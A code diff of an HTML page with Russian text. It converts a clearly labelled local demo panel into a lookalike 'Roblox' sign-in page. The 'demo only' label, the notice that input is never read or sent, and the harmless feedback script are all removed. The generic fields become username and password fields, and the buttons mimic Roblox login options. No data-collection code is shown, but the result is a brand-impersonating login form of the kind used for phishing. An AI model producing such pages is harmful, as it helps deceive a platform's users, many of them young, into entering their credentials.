@@ -3,83 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Локальный демонстрационный интерфейс. Данные не отправляются и не сохраняются.">
-    <title>Демо-панель</title>
+    <meta name="description" content="Вход в Roblox">
+    <title>Roblox</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <main class="login-card" aria-labelledby="demo-title">
-        <div class="demo-label">DEMO · ТОЛЬКО ПРИМЕР</div>
-        <h1 id="demo-title">Демо-панель</h1>
+    <main class="login-card" aria-labelledby="login-title">
+        <h1 id="login-title">Войти в Roblox</h1>
 
         <div class="demo-fields">
             <input
                 class="demo-input"
                 type="text"
-                placeholder="Первое поле для примера"
-                aria-label="Первое демонстрационное поле"
+                placeholder="Имя пользователя/Электронная почта/Телефон"
+                aria-label="Имя пользователя, электронная почта или телефон"
                 autocomplete="off"
                 autocapitalize="off"
                 spellcheck="false"
             >
             <input
                 class="demo-input"
-                type="text"
-                placeholder="Второе поле для примера"
-                aria-label="Второе демонстрационное поле"
-                autocomplete="off"
+                type="password"
+                placeholder="Пароль"
+                aria-label="Пароль"
+                autocomplete="new-password"
                 spellcheck="false"
             >
 
-            <button class="demo-submit" type="button"
-                data-demo-message="Готово! Это только демонстрация — введённый текст не обрабатывается.">
-                Продолжить демо
+            <button class="demo-submit" type="button">
+                Авторизоваться
             </button>
         </div>
 
-        <p class="demo-help" id="demo-status" role="status" aria-live="polite">
-            Здесь можно проверить внешний вид полей и кнопок.
+        <p class="demo-help" id="login-status" role="status" aria-live="polite">
+            Забыли пароль или имя пользователя?
         </p>
 
         <hr class="demo-divider">
 
         <div class="demo-actions">
-            <button class="demo-action" type="button"
-                data-demo-message="Раздел «Обзор» показан только для примера.">
-                Открыть раздел «Обзор»
+            <button class="demo-action" type="button">
+                Отправить мне одноразовый код по электронной почте
             </button>
-            <button class="demo-action" type="button"
-                data-demo-message="Быстрый просмотр — демонстрационная кнопка.">
-                Быстрый просмотр
+            <button class="demo-action" type="button">
+                Быстрый вход
             </button>
-            <button class="demo-action" type="button"
-                data-demo-message="Другие варианты доступны только в демонстрационном макете.">
-                Другие варианты демо
+            <button class="demo-action" type="button">
+                Другие варианты входа в систему
             </button>
         </div>
 
         <div class="demo-footer">
-            <span>Это тестовый интерфейс.</span>
-            <button class="demo-link" type="button"
-                data-demo-message="Спасибо за просмотр демонстрационного макета!">
-                Показать подсказку
+            <span>У вас нет аккаунта?</span>
+            <button class="demo-link" type="button">
+                Зарегистрируйтесь
             </button>
         </div>
-
-        <p class="demo-notice">
-            ДЕМО: введённый текст не считывается скриптами, не отправляется
-            на сервер и не сохраняется.
-        </p>
     </main>
-
-    <script>
-        // Local-only demo feedback. This script never reads the input fields.
-        document.querySelectorAll("[data-demo-message]").forEach((button) => {
-            button.addEventListener("click", () => {
-                document.getElementById("demo-status").textContent =
-                    button.dataset.demoMessage;
-            });
-        });
-    </script>
 </body>
 </html>
